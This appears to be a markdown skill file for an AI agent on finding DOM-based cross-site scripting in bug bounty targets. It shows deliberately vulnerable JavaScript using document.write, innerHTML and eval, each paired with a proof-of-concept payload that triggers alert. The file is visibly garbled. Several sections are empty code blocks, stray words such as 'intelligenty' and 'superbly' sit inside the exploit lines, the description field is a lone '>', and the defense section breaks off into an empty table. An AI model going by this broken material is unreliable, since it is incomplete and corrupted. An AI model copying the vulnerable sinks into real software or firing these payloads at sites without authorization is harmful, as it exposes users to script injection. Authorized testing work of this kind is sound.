---
name: "dom-based-xss"
description: ">"
---

# Dom Based Xss

*Sourced from akashrpatil-awesome-offensive-security-skills*

# DOM-Based XSS

## When to Use
- When auditing modern Single Page Applications (SPAs) built with frameworks like React, Angular, or purely complex vanilla JavaScript.
- When searching for client-side vulnerabilities where user input is processed directly in the browser (e.g., via `location.hash`, `window.name`, or `document.referrer`).


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Understanding DOM XSS

```text
# Concept: DOM XSS ```

### Phase 2: Identifying Sources and Sinks

```text
# Common Sources ```

### Phase 3: Exploitation Examples

```javascript
# Example 1: `document.write` // VULNERABLE CODE let query = new URLSearchParams(window.location.search).get('q');
document.write("Results for: " + query); // SINK

// EXPLOIT target.com/search?q=<script>alert(1)</script>


# Example 2: `innerHTML` VULNERABLE CODE let hash = window.location.hash.slice(1);
document.getElementById('profile').innerHTML = decodeURIComponent(hash); // SINK

// EXPLOIT intelligenty // target.com/#<img%20src=x%20onerror=alert(document.domain)>


# Example 3: `eval()` VULNERABLE CODE let data = window.name;
eval("var x = " + data); // SINK

// EXPLOIT superbly // window.name = "1; alert('XSS') //";
// window.location = "http://target.com/vuln";
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Map Sources ] --> B{Valid Sink? ]}
    B -->|Yes| C[Craft Payload ]
    B -->|No| D[Find Others ]
    C --> E[Execute ]
```


## 🔵 Blue Team Detection & Defense
- **Context-Aware Encoding**: **Safe APIs**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Dom Based Xss — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- PortSwigger: [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

